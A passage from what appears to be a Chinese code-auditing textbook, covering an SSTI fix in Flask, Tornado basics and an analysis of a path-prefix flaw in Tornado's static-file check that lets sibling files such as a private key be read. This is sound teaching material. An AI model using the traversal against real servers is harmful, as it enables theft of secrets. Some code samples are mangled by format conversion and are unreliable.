![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image670.jpg)\r
\r
\u56FE14-16 SSTI\u524D\u53F0\u9875\u9762\r
\r
2.SSTI\u6F0F\u6D1E\u9632\u5FA1\r
\r
\u4E0B\u9762\u7ED9\u51FAFlask\u6846\u67B6\u4E2DSSTI\u6F0F\u6D1E\u6848\u4F8B\u4EE3\u7801\u3002\r
\r
\r
\r
**code** = request.args.get('ssti')\r
\r
  html = '''\r
\r
\u200B    <h1>qing -SSIT</h1>\r
\r
\u200B    <h2>The ssti is </h2>\r
\r
\u200B      <h3>**{{code}}**</h3>\r
\r
\u200B    ''' \r
\r
  return render_template_string(html)\r
\r
\r
\r
\u5C06template \u4E2D\u7684\u201D\u2019<h3> %s!</h3>\u201D\u2019%code\u6539\u4E3A\u201D\u2019<h3>{{code}}</h3>\u201D\u2019\uFF0C\u8FD9\u6837\uFF0CJinja2\u5728\u6A21\u677F\u6E32\u67D3\u7684\u65F6\u5019\u5C06request.url\u7684\u503C\u66FF\u6362\u6389{{code}}, \u800C\u4E0D\u4F1A\u5BF9code\u5185\u5BB9\u8FDB\u884C\u4E8C\u6B21\u6E32\u67D3\u8FD9\u6837\u5373\u4F7Fcode\u4E2D\u542B\u6709{{}}\u4E5F\u4E0D\u4F1A\u8FDB\u884C\u6E32\u67D3\uFF0C\u800C\u53EA\u662F\u628A\u5B83\u5F53\u505A\u666E\u901A\u5B57\u7B26\u4E32\r
\r
## 14.4 Tornado\u6846\u67B6\u5E38\u89C1\u6F0F\u6D1E\r
\r
### 14.4.1 Tornado\u6846\u67B6\u4ECB\u7ECD\r
\r
1.Tornado\u7B80\u4ECB\r
\r
Tornado \u662F\u4E00\u4E2APython Web\u6846\u67B6\u548C\u5F02\u6B65\u7F51\u7EDC\u5E93\uFF0C\u901A\u8FC7\u4F7F\u7528\u975E\u963B\u585E\u7F51\u7EDCI/O\uFF0CTornado\u53EF\u4EE5\u652F\u6301\u4E0A\u4E07\u7EA7\u7684\u8FDE\u63A5\uFF0C\u5904\u7406\u957F\u8FDE\u63A5\u3001 WebSockets\u548C\u5176\u4ED6\u9700\u8981\u4E0E\u6BCF\u4E2A\u7528\u6237\u4FDD\u6301\u957F\u4E45\u8FDE\u63A5\u7684\u5E94\u7528\u3002\r
\r
\u4E0E\u5176\u4ED6Python Web\u6846\u67B6\u76F8\u6BD4\uFF0CTorando\u5177\u6709\u5F88\u591A\u4F18\u52BF\uFF1A\r
\r
l \u8F7B\u91CF\u7EA7Web\u6846\u67B6\uFF1B\r
\r
l \u5F02\u6B65\u975E\u963B\u585EIO\u5904\u7406\u65B9\u5F0F\uFF1B\r
\r
l \u51FA\u8272\u7684\u6297\u8D1F\u8F7D\u80FD\u529B\uFF1B\r
\r
l \u4F18\u5F02\u7684\u5904\u7406\u6027\u80FD\uFF0C\u4E0D\u4F9D\u8D56\u591A\u7EBF\u7A0B\uFF0C\u4E00\u5B9A\u7A0B\u5EA6\u4E0A\u89E3\u51B3C10K\u95EE\u9898\uFF1B\r
\r
l WSGI\u5168\u6808\u66FF\u4EE3\u4EA7\u54C1\uFF0C\u63A8\u8350\u540C\u65F6\u4F7F\u7528\u5176Web\u6846\u67B6\u548CHTTP\u670D\u52A1\u5668\u3002\r
\r
\\2. Tornado\u5B89\u88C5\r
\r
Tornado\u6846\u67B6\u7684\u5B89\u88C5\u4E0E\u5176\u4ED6\u7684Python\u7F16\u5199\u7684Web\u6846\u67B6\u7C7B\u4F3C\uFF0C\u5176\u4E3B\u8981\u5206\u4E3A\u624B\u52A8\u5B89\u88C5\u4E0E\u81EA\u52A8\u5B89\u88C5\u4E24\u79CD\u3002\r
\r
l \u81EA\u52A8\u5B89\u88C5\r
\r
  \u901A\u8FC7pip\u65B9\u5F0F\u81EA\u52A8\u5B89\u88C5Tornado\u6846\u67B6\uFF0C\u4F7F\u7528\u547D\u4EE4\u5982\u4E0B\uFF1A\r
\r
\r
\r
pip install tornado\r
\r
\r
\r
l \u624B\u52A8\u5B89\u88C5\r
\r
\u4ECE\u5B98\u7F51\u4E0B\u8F7DTornado\u5B89\u88C5\u5305\uFF0C\u624B\u52A8\u6267\u884Cpython\u5B89\u88C5\u811A\u672C\u8FDB\u884C\u5B89\u88C5\uFF0C\u4F7F\u7528\u547D\u4EE4\u5982\u4E0B\uFF1A\r
\r
\r
\r
$ curl -L -O https://github.com/facebook/tornado/archive/v3.1.0.tar.gz\r
\r
$ tar xvzf v3.1.0.tar.gz\r
\r
$ cd tornado-3.1.0\r
\r
$ python setup.py build\r
\r
$ sudo python setup.py install\r
\r
\r
\r
\\3. Tornado\u76EE\u5F55\u7ED3\u6784\r
\r
\u4E00\u4E2A\u7B80\u5355\u7684Tornado\u9879\u76EE\u76EE\u5F55\u4E0E\u5176\u4ED6\u7684Web\u6846\u67B6\u76EE\u5F55\u7C7B\u4F3C\uFF0C\u90FD\u9075\u5FAAMVC\u6A21\u5F0F\u8FDB\u884C\u8BBE\u8BA1\u3002Tornado\u7684\u76EE\u5F55\u7ED3\u6784\u4E3B\u8981\u5305\u62EC\uFF1Acontroller\u3001models\u3001views\u3002\r
\r
l Controller\uFF1AWeb\u7A0B\u5E8F\u63A7\u5236\u5C42\uFF0C\u5176\u7528\u6765\u5904\u7406\u7A0B\u5E8F\u7684\u903B\u8F91\u4E1A\u52A1\uFF1B\r
\r
l Models\uFF1AWeb\u7A0B\u5E8F\u6A21\u5757\u5C42\uFF0C\u5176\u7528\u6765\u5B9A\u4E49\u7A0B\u5E8F\u7684\u62BD\u8C61\u7C7B\uFF1B\r
\r
l Views\uFF1AWeb\u7A0B\u5E8F\u89C6\u56FE\u5C42\uFF0C\u5176\u7528\u6765\u5B9A\u4E49\u7A0B\u5E8F\u7684HTML\u89C6\u56FE\u3002\r
\r
\u9664\u6B64\u4E4B\u5916\uFF0CWeb\u5E94\u7528\u7A0B\u5E8F\u6700\u5916\u5C42\u90FD\u5B58\u5728\u4E00\u4E2A\u8C03\u7528\u7A0B\u5E8F\uFF0C\u5176\u4E3B\u8981\u7528\u6765\u5BF9\u5916\u63D0\u4F9B\u7A0B\u5E8F\u8C03\u7528\u7684\u4E3B\u5165\u53E3\uFF0C\u4E0B\u56FE14-17\u4E3ATornado\u9879\u76EE\u7684\u7B80\u5355\u76EE\u5F55\u7ED3\u6784\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image672.jpg)\r
\r
\u56FE14-17 Tornado\u76EE\u5F55\u7ED3\u6784\u56FE\r
\r
\\4. Tornado\u6848\u4F8B\r
\r
Tornado\u6846\u67B6\u7F16\u5199\u7684\u4E00\u4E2AWeb\u670D\u52A1\u5668\u4EE3\u7801\uFF0C\u5728\u6D4F\u89C8\u5668\u8F93\u5165127.0.0.1:8080/index\uFF0C \u5C31\u4F1A\u5F97\u5230\u5305\u542B\u2018home page\u2019\u5B57\u7B26\u7684\u7F51\u9875\u3002\r
\r
\r
\r
\\#coding:utf-8\r
\r
import tornado.ioloop\r
\r
import tornado.web\r
\r
from controllers.login import LoginHandler\r
\r
class **MainHandler**(tornado.web.RequestHandler):  \r
\r
  def **get**(self, *args, **kwargs):\r
\r
\u200B    self.write('home page')\r
\r
def **make_app():**\r
\r
  **# tornado.web.Application([(\u7F51\u57401),(\u7F51\u57402)]) \u6839\u636E\u8DEF\u5F84\u4FEE\u6539\u7F51\u5740\u5185\u5BB9**\r
\r
  return tornado.web.Application([\r
\r
  **(r'/index',MainHandler),**\r
\r
  **(r'/login',LoginHandler),**\r
\r
])\r
\r
if __name__ == '__main__':\r
\r
  app = **make_app()**\r
\r
app.listen(8080)    #\u76D1\u542C\u7AEF\u53E3\u53F7\r
\r
  tornado.ioloop.IOLoop.instance().start() #\u5F00\u542F\u670D\u52A1\u5668\r
\r
\r
\r
\u4E0A\u9762\u5C06\u6240\u6709\u4EE3\u7801\u5199\u5728\u4E86\u4E00\u4E2A\u4EE3\u7801\u6587\u4EF6\u4E2D\uFF0C\u5F00\u53D1\u8005\u4E5F\u53EF\u4EE5\u5229\u7528MVC\u8BBE\u8BA1\u65B9\u5F0F\u5206\u5F00\u7F16\u5199\u3002\u5C06\u5904\u7406\u2018/login\u2019\u8BF7\u6C42\u7684\u7C7BLoginHandler\u653E\u5728controllers\u6587\u4EF6\u5939\u4E0B\uFF0C\u5C06\u89C6\u56FE\u6587\u4EF6login.html\u653E\u5728views\u6587\u4EF6\u5939\u4E0B\uFF08\u9700\u8981\u914D\u7F6E\u2018template_path\u2019\uFF09,\u800Cmodels\u6587\u4EF6\u5939\u4E0B\u53EF\u4EE5\u5B58\u653E\u548C\u6570\u636E\u5E93\u5904\u7406\u76F8\u5173\u7684\u4EE3\u7801\uFF0Cstatics\u4E2D\u5B58\u653E\u9759\u6001\u6587\u4EF6\uFF0C\u5982css\u3001js\u7B49\uFF0C\u9700\u8981\u914D\u7F6E\u8DEF\u5F84\uFF1A'static_path':'statics'\u3002\r
\r
### 14.4.2 Tornado\u4E2D\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\r
\r
1.Tornado\u8BFB\u53D6\u9759\u6001\u6587\u4EF6\r
\r
Tornado\u662F\u4E00\u4E2A\u5168\u5F02\u6B65\u7684\u6846\u67B6\uFF0C\u8BE5\u6846\u67B6\u652F\u6301\u4E24\u79CD\u8BFB\u53D6\u9759\u6001\u6587\u4EF6\u7684\u65B9\u5F0F\uFF1A\u6587\u4EF6\u63A7\u5236\u5668\u8BFB\u53D6\u3001setting\u4E2D\u6307\u5B9A\u9759\u6001\u8DEF\u5F84\u3002\r
\r
\uFF081\uFF09StaticFileHandler\u8BFB\u53D6\u6587\u4EF6\r
\r
\u8BE5\u6846\u67B6\u4E2D\u5B58\u5728\u4E00\u4E2A\u4E13\u95E8\u5904\u7406\u9759\u6001\u6587\u4EF6\u7684\u63A7\u5236\u5668\u2014\u2014StaticFileHandler\u3002\u7A0B\u5E8F\u5F00\u53D1\u65F6\uFF0C\u53EA\u8981\u6307\u5B9A\u4E00\u4E2A\u76EE\u5F55\u5BF9\u5E94\u5230\u8BE5\u63A7\u5236\u5668\u4E2D\uFF0C\u5373\u53EF\u5728HTTP\u8BF7\u6C42\u4E2D\u76F4\u63A5\u8BF7\u6C42\u5230\u8BE5\u76EE\u5F55\u4E0B\u7684\u6587\u4EF6\uFF0C\u5982\u56FE14-18\u6240\u793A\r
\r
![https://wooyun.x10sec.org/static/bugs/full/b856f47b9415fbc3859e5d23b0ac993fc6bda844.jpg](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image674.jpg)\r
\r
\u56FE14-18 StaticFileHandler\u89E3\u91CA\r
\r
  \uFF082\uFF09setting\u914D\u7F6E\u9759\u6001\u76EE\u5F55\r
\r
Tornado\u6846\u67B6\u8FD8\u652F\u6301\u5728setting\u4E2D\u76F4\u63A5\u6307\u5B9Astatic_path\u53C2\u6570\uFF0C\u8BF4\u660E\u9759\u6001\u6587\u4EF6\u5B58\u653E\u5728\u54EA\u4E2A\u76EE\u5F55\u4E0B\uFF0C\u5982\u4E0B\u4EE3\u7801\uFF1A\r
\r
\r
\r
import tornado.webclass MainHandler(tornado.web.RequestHandler):\r
\r
  def get(self):\r
\r
\u200B    self.write("Hello, world")if __name__ == "__main__":\r
\r
  **setting** = {\r
\r
\u200B    "debug": True,\r
\r
\u200B    **"static_path": "/Users/phithon/pro/python/wooyun/tornado-file-read/static/",**\r
\r
  }application = tornado.web.Application([\r
\r
\u200B    (r"/", MainHandler),\r
\r
  ], **setting)\r
\r
  application.listen(8888)\r
\r
  **.**.**.**loop.IOLoop.instance().start()\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6307\u5B9A\u53EF\u8BFB\u53D6\u7684\u9759\u6001\u6587\u4EF6\u76EE\u5F55\u4E3A/Users/phithon/pro/python/wooyun/tornado-file-read/static/\uFF0C\u5F53\u6211\u4EEC\u76F4\u63A5\u8BF7\u6C42\u5230\u8BE5\u76EE\u5F55\u4E0B\u768401.txt\u9759\u6001\u6587\u4EF6\uFF0C\u663E\u793A\u7684\u9875\u9762\u5982\u56FE14-19\u6240\u793A\u3002\r
\r
![https://wooyun.x10sec.org/static/bugs/full/de8404cda2a6589cc5770d9c138c67395e6efcda.jpg](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image676.jpg)\r
\r
\u56FE14-19 \u67E5\u770B\u9759\u6001\u6587\u4EF6\u56FE\r
\r
\u5F53\u653B\u51FB\u8005\u5C1D\u8BD5\u53D1\u9001\u8BF7\u6C42\u8BBF\u95EE\u8BE5\u670D\u52A1\u5668static\u76EE\u5F55\u5916\u7684\u6587\u4EF6/etc/passwd\u65F6\uFF0C\u5219\u4F1A\u629B\u51FAHTTP 403\u7981\u6B62\u8BBF\u95EE\u5F02\u5E38\uFF0C\u5982\u56FE14-20\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image678.jpg)\r
\r
\u56FE14-20 \u6B63\u5E38\u62A5\u9519\u56FE\r
\r
2.Tornado\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u6F0F\u6D1E\u5206\u6790\r
\r
Tornado\u6846\u67B6\u4E2D\u5BF9\u8BFB\u53D6\u9759\u6001\u6587\u4EF6\u8DEF\u5F84\u662F\u5426\u5408\u6CD5\u5904\u5B58\u5728\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u53EF\u901A\u8FC7\u8BE5\u6F0F\u6D1E\u5B9E\u73B0\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\uFF0C\u4E0B\u9762\u7ED9\u51FATornado\u6846\u67B6\u5224\u5B9A\u8DEF\u5F84\u5408\u6CD5\u7684\u6E90\u4EE3\u7801\uFF0C\u5E76\u5BF9\u5176\u8FDB\u884C\u6F0F\u6D1E\u5206\u6790\u3002\r
\r
\r
\r
def validate_absolute_path(self, root, absolute_path):\r
\r
\u200B    **root = os.path.abspath(root)**\r
\r
\u200B    **if not (absolute_path + os.path.sep).startswith(root):**\r
\r
\u200B      raise HTTPError(403, "%s is not in root static directory",self.path)\r
\r
\u200B    if (os.path.isdir(absolute_path) and\r
\r
\u200B        self.default_filename is not None):\r
\r
\u200B      if not self.request.path.endswith("/"):\r
\r
\u200B        self.redirect(self.request.path + "/", permanent=True)\r
\r
\u200B        return\r
\r
\u200B      absolute_path = os.path.join(absolute_path, self.default_filename)\r
\r
\u200B    if not os.path.exists(absolute_path):\r
\r
\u200B      raise HTTPError(404)\r
\r
\u200B    if not os.path.isfile(absolute_path):\r
\r
\u200B      raise HTTPError(403, "%s is not a file", self.path)\r
\r
\u200B    return absolute_path\r
\r
\r
\r
\u5173\u952E\u4EE3\u7801\u662Froot = os.path.abspath(root)\uFF0Cif not (absolute_path + os.path.sep).startswith(root):os.path.abspath\u83B7\u53D6root\u53D8\u91CF\u6307\u5B9A\u7684\u7EDD\u5BF9\u8DEF\u5F84\u3002\r
\r
root\u5B9E\u9645\u4E0A\u662F\u7A0B\u5E8F\u4E2Dsetting\u7684\u201Cstatic_path\u201D\uFF0C\u8BE5\u53C2\u6570\u6307\u5B9A\u9759\u6001\u6587\u4EF6\u76EE\u5F55\u7684\u7EDD\u5BF9\u8DEF\u5F84\u3002\u4F46\u5728python\u4E2D\uFF0Cos.path.abspath\u51FD\u6570\u83B7\u5F97\u7684\u8DEF\u5F84\u7ED3\u5C3E\u4E0D\u5B58\u5728\u7B26\u53F7\u201C/\u201D\u3002\u4F8B\u5982\uFF1A\u4F20\u5165\u7684\u8DEF\u5F84\u662F\u201C/Users/phithon/pro/python/wooyun/tornado-file-read/static/\u201D\uFF0C\u7ECF\u8FC7os.path.abspath\u51FD\u6570\u5904\u7406\uFF0C\u8DEF\u5F84\u53D8\u4E3A\u201C/Users/phithon/pro/python/wooyun/tornado-file-read/static\u201D\u3002\r
\r
\u4E0A\u8FF0\u6E90\u4EE3\u7801\u4F1A\u5BF9\u8BF7\u6C42\u7684\u9759\u6001\u6587\u4EF6\u8DEF\u5F84\u8FDB\u884C\u5224\u65AD\uFF0C\u4E0D\u4EE5root\u5F00\u5934\u5219\u4F1A\u63D0\u793A403\u9519\u8BEF\u3002\u56E0\u4E3APathon\u7A0B\u5E8F\u5728root\u8FD9\u4E2A\u53D8\u91CF\u662F\u6CA1\u6709\u201C/\u201C\u7684\uFF0C\u90A3\u4E48\u5982\u679C\u6211\u6709\u4E00\u4E2A\u6587\u4EF6\u662F\u201C/Users/phithon/pro/python/wooyun/tornado-file-read/static.db\u201D\uFF0C\u6216\u4E00\u4E2A\u76EE\u5F55\u662F\u201C/Users/phithon/pro/python/wooyun/tornado-file-read/static_private/\u201D\uFF0C\u90A3\u5C31\u90FD\u662F\u4EE5\u201C/Users/phithon/pro/python/wooyun/tornado-file-read/static\u201D\u5F00\u5934\u7684\uFF0C\u4F46\u8FD9\u4E9B\u6587\u4EF6\u5E76\u4E0D\u5728static\u8FD9\u4E2A\u76EE\u5F55\u4E0B\uFF0C\u6240\u4EE5\u5E76\u6CA1\u6709\u89E6\u53D1403\u9519\u8BEF\u3002\r
\r
\u8FD9\u79CD\u60C5\u51B5\u4E0B\u9020\u6210\u4E86\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u8BFB\u53D6\u5230\u4E86\u672C\u4E0D\u5E94\u8BE5\u88AB\u8BFB\u53D6\u7684\u67D0\u4E9B\u6587\u4EF6\uFF0C\u4ECE\u800C\u9020\u6210\u4E86\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\uFF0C\u5728\u7279\u6B8A\u60C5\u51B5\u4E0B\uFF0C\u5982\u679C\u5F00\u53D1\u8005\u6307\u5B9A\u7684\u9759\u6001\u76EE\u5F55\u4E3Atest\uFF0C\u90A3\u4E48\u5C31\u53EF\u4EE5\u8BFB\u53D6\u6240\u6709test\u4E0A\u5C42\u7684\u76EE\u5F55\u4E0B\u7684\u540D\u5B57\u5F00\u5934\u4E3Atest\u7684\u6587\u4EF6\u3001\u76EE\u5F55\u3002\r
\r
\u5047\u8BBE\u67D0Tornado\u7A0B\u5E8F\u4E2D\u6709\u4E00\u4E2A\u6570\u636E\u5E93\u53EBstatic_private.sqlite3\uFF0C\u6709\u4E2A\u76EE\u5F55\u53EBstatic_private\uFF0C\u91CC\u9762\u653E\u7740\u654F\u611F\u4FE1\u606F\u79C1\u94A5private.key\uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u4F7F\u7528\u8BE5\u6F0F\u6D1E\u8BFB\u53D6\u8BE5\u79C1\u94A5\u7684\u5185\u5BB9\uFF0C\u5982\u56FE14-21\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image680.jpg)\r
\r
\u56FE14-21 \u6587\u4EF6\u8BFB\u53D6\u5229\u7528\u56FE\r
\r
## 14.5 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u4E3B\u8981\u5B66\u4E60\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u7684Python\u6846\u67B6\u5BA1\u8BA1\u90E8\u5206\uFF0C\u5206\u522B\u5305\u62EC\uFF1APython\u6846\u67B6\u4EE3\u7801\u5BA1\u8BA1\u7684\u5165\u95E8\u77E5\u8BC6\u3001Django\u6846\u67B6\u5BA1\u8BA1\u7684\u5E38\u89C1\u6F0F\u6D1E\uFF08SQL\u6CE8\u5165\u6F0F\u6D1E\u3001XSS\u6F0F\u6D1E\u3001CSRF\u6F0F\u6D1E\u3001\u5176\u4ED6\u6F0F\u6D1E\uFF09\uFF0C\u7136\u540E\u5BF9Flask\u6846\u67B6\u548CTornado\u6846\u67B6\u7684\u57FA\u7840\u77E5\u8BC6\u3001SSTI\u6F0F\u6D1E\u3001\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u8FDB\u884C\u4ECB\u7ECD\u3002\u901A\u8FC7\u5BF9\u5E38\u89C1\u6846\u67B6\u6F0F\u6D1E\u6848\u4F8B\u8FDB\u884C\u5217\u4E3E\uFF0C\u4F7F\u8BFB\u8005\u719F\u6089\u5E38\u89C1\u7684Python\u6846\u67B6\u6F0F\u6D1E\u7684\u5BA1\u8BA1\u65B9\u6CD5\u3002\r
\r
\r
\r
 \r
\r
# \u672F\u8BED\u8868\r
\r
\\1.  CMS\uFF1ACMS\u6307\u7684\u662F\u5185\u5BB9\u7BA1\u7406\u7CFB\u7EDF\uFF0C\u5B83\u5177\u6709\u5F88\u591A\u57FA\u4E8E\u6A21\u677F\u7684\u4F18\u79C0\u8BBE\u8BA1\uFF0C\u4ECE\u800C\u589E\u52A0\u7F51\u7AD9\u5EFA\u8BBE\u7684\u901F\u5EA6\u5E76\u51CF\u5C11\u5F00\u53D1\u6210\u672C\uFF0C\u662F\u73B0\u5728\u5F88\u591A\u4F01\u4E1A\u548C\u4E2A\u4EBA\u5728\u505A\u7F51\u7AD9\u5EFA\u8BBE\u7684\u9996\u9009\u65B9\u6CD5\u3002\r
\r
\\2.  ISO8859\u3001UTF-8\u3001GB2312\u3001GBK\uFF1A\u8BA1\u7B97\u673A\u5E38\u89C1\u7684\u7F16\u7801\u65B9\u5F0F\uFF0C\u662F\u4FE1\u606F\u5728\u8BA1\u7B97\u673A\u4E2D\u7684\u4E00\u79CD\u8868\u73B0\u5F62\u5F0F\u3002\r
\r
\\3.  Php.ini\uFF1APHP\u7F16\u7A0B\u8BED\u8A00\u73AF\u5883\u7684\u914D\u7F6E\u6587\u4EF6\uFF0C\u53EF\u7528\u4E8E\u914D\u7F6EPHP\u90E8\u5206\u529F\u80FD\u7684\u5F00\u542F\u4E0E\u5173\u95ED\u3002\r
\r
\\4.  Boolean\uFF1A\u6307\u7684\u662F\u4E00\u79CD\u6570\u636E\u7C7B\u578B\u3002Boolean\u53D8\u91CF\u5B58\u50A8\u4E3A8\u4F4D\uFF081\u4E2A\u5B57\u8282\uFF09\u7684\u6570\u503C\u5F62\u5F0F\uFF0C\u5176\u53EA\u80FD\u662FTrue \u6216\u662F False\u3002\r
\r
\\5.  \u952E\u503C\u5BF9\uFF1A\u5728\u8BA1\u7B97\u673A\u79D1\u5B66\u4E2D\uFF0C\u952E\u503C\u5BF9\u662F\u4E00\u79CD\u5728\u8BA1\u7B97\u7CFB\u7EDF\u548C\u5E94\u7528\u7A0B\u5E8F\u4E2D\u7684\u57FA\u672C\u6570\u636E\u8868\u793A\u5F62\u5F0F\u3002\u6570\u636E\u6A21\u578B\u5C06\u8868\u793A\u4E3A\u5143\u7EC4\u7684\u96C6\u5408<name\uFF0Cvalue>\uFF0Cname\u4E3A\u6210\u4E3A\u952E\u3001value\u79F0\u4E3A\u503C\u3002\r
\r
\\6.  XML\uFF1A\u53EF\u6269\u5C55\u6807\u8BB0\u8BED\u8A00\uFF0C\u6807\u51C6\u901A\u7528\u6807\u8BB0\u8BED\u8A00\u7684\u5B50\u96C6\uFF0C\u7B80\u79F0XML\u3002\u5176\u662F\u4E00\u79CD\u7528\u4E8E\u6807\u8BB0\u7535\u5B50\u6587\u4EF6\u4F7F\u5176\u5177\u6709\u7ED3\u6784\u6027\u7684\u6807\u8BB0\u8BED\u8A00\u3002\r
\r
\\7.  URL\uFF1A\u7EDF\u4E00\u8D44\u6E90\u5B9A\u4F4D\u7CFB\u7EDF\uFF08uniform resource locator\uFF0CURL\uFF09\u662F\u56E0\u7279\u7F51\u7684\u4E07\u7EF4\u7F51\u670D\u52A1\u7A0B\u5E8F\u4E0A\u7528\u4E8E\u6307\u5B9A\u4FE1\u606F\u4F4D\u7F6E\u7684\u8868\u793A\u65B9\u6CD5\u3002\r
\r
\\8.  Payload\uFF1A\u4E2D\u6587\u201C\u6709\u6548\u8F7D\u8377\u201D\uFF0C\u6307\u6210\u529F\u5229\u7528\u7CFB\u7EDF\u6F0F\u6D1E\u4E4B\u540E\uFF0C\u771F\u6B63\u5728\u76EE\u6807\u7CFB\u7EDF\u6267\u884C\u7684\u4EE3\u7801\u6216\u6307\u4EE4\u3002\r
\r
\\9.  Token\u9A8C\u8BC1\uFF1AToken\u662F\u670D\u52A1\u7AEF\u751F\u6210\u7684\u4E00\u4E32\u5B57\u7B26\u4E32\uFF0C\u4EE5\u4F5C\u5BA2\u6237\u7AEF\u8FDB\u884C\u8BF7\u6C42\u7684\u4E00\u4E2A\u4EE4\u724C\uFF0C\u5F53\u7B2C\u4E00\u6B21\u767B\u5F55\u540E\uFF0C\u670D\u52A1\u5668\u751F\u6210\u4E00\u4E2AToken\u4FBF\u5C06\u6B64Token\u8FD4\u56DE\u7ED9\u5BA2\u6237\u7AEF\uFF0C\u4EE5\u540E\u5BA2\u6237\u7AEF\u53EA\u9700\u5E26\u4E0A\u8FD9\u4E2AToken\u524D\u6765\u8BF7\u6C42\u6570\u636E\u5373\u53EF\uFF0C\u65E0\u9700\u518D\u6B21\u5E26\u4E0A\u7528\u6237\u540D\u548C\u5BC6\u7801\u3002\r
\r
\\10. Web\u540E\u95E8\uFF1AWeb\u540E\u95E8\u5C31\u4EE5asp\u3001php\u3001jsp\u6216\u8005cgi\u7B49\u7F51\u9875\u6587\u4EF6\u5F62\u5F0F\u5B58\u5728\u7684\u4E00\u79CDWeb\u547D\u4EE4\u6267\u884C\u73AF\u5883\uFF0C\u4E5F\u53EF\u4EE5\u5C06\u5176\u79F0\u505A\u4E3A\u4E00\u79CD\u7F51\u9875\u540E\u95E8\u3002\r
\r
\\11. cmd\u6307\u4EE4\uFF1A\u662F\u4E00\u79CD\u547D\u4EE4\u63D0\u793A\u7B26\uFF0Ccmd\u662Fcommand\u7684\u7F29\u5199\uFF0C\u5373\u547D\u4EE4\u63D0\u793A\u7B26\uFF08cmd\uFF09\u3002\r
\r
\\12. bash\u6307\u4EE4\uFF1Abash(GNU Bourne-Again Shell)\u662F\u5927\u591A\u6570Linux\u7CFB\u7EDF\u9ED8\u8BA4\u7684shell\u7A0B\u5E8F\uFF0C\u662F\u4E00\u4E2A\u4E3AGNU\u8BA1\u5212\u7F16\u5199\u7684Unix shell\u3002\r
\r
\\13. Session\uFF1A\u5728\u8BA1\u7B97\u673A\u4E2D\u79F0\u4E3A\u201C\u4F1A\u8BDD\u63A7\u5236\u201D\u3002Session\u5BF9\u8C61\u5B58\u50A8\u7279\u5B9A\u7528\u6237\u4F1A\u8BDD\u6240\u9700\u7684\u5C5E\u6027\u53CA\u914D\u7F6E\u4FE1\u606F\u3002\u8FD9\u6837\uFF0C\u5F53\u7528\u6237\u5728\u5E94\u7528\u7A0B\u5E8F\u7684Web\u9875\u4E4B\u95F4\u8DF3\u8F6C\u65F6\uFF0C\u5B58\u50A8\u5728Session\u5BF9\u8C61\u4E2D\u7684\u53D8\u91CF\u5C06\u4E0D\u4F1A\u4E22\u5931\uFF0C\u800C\u662F\u5728\u6574\u4E2A\u7528\u6237\u4F1A\u8BDD\u4E2D\u4E00\u76F4\u5B58\u5728\u4E0B\u53BB\u3002\r
\r
\\14. CI\u6846\u67B6\uFF1ACI\u5168\u79F0\u4E3A\u201CCodeIgniter\u201D\uFF0C\u5B83\u662F\u4E00\u4E2A\u5C0F\u5DE7\u4F46\u529F\u80FD\u5F3A\u5927\u7684PHP\u6846\u67B6\uFF0C\u662F\u4E00\u4E2A\u7B80\u5355\u7684\u5DE5\u5177\u5305\uFF0C\u9002\u5408\u5F00\u53D1\u8005\u4EEC\u5EFA\u7ACB\u529F\u80FD\u5B8C\u5584\u7684Web\u5E94\u7528\u7A0B\u5E8F\u3002\r
\r
 `;export{r as _};
